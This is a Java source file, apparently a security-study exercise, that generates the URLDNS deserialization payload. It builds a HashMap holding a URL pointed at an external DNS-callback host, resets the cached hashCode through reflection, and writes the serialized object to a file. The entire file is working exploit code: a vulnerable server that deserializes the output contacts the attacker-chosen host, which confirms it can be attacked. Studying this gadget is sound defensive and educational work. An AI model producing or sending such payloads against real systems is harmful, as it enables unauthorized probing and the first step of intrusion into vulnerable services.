/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.deserialize;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.*;
import java.util.HashMap;

public class TestURLDNSExp {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        //通过实例化URLStreamHandler子类自定义handler，从而实现重写
        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u){
                return null;
            }
        };

        //反射获取URL类并使用自定义handler进行实例化
        Class clazz = Class.forName("java.net.URL");
        Constructor constructor = clazz.getConstructor(URL.class,String.class,URLStreamHandler.class);
        Object object = constructor.newInstance(null,"http://urldns.d1dd3347.su19.org",handler);
        //反射获取URL类中的hashCode属性，并修改访问权限
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);

        //实例化HashMap对象
        HashMap ht = new HashMap();
        //调用HashMap.put方法传入
        ht.put(object,1);
        //注意这里是put后再将hashCode设置为-1，否则put过程会通过hash方法重新覆盖
        field.set(object,-1);

        //序列化HashMap输出payload到文件
        FileOutputStream fos = new FileOutputStream("H:\\学习记录\\学习记录Markdown\\Java安全通用\\URLDNS2");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(ht);

        System.out.println(ht);
    }
}
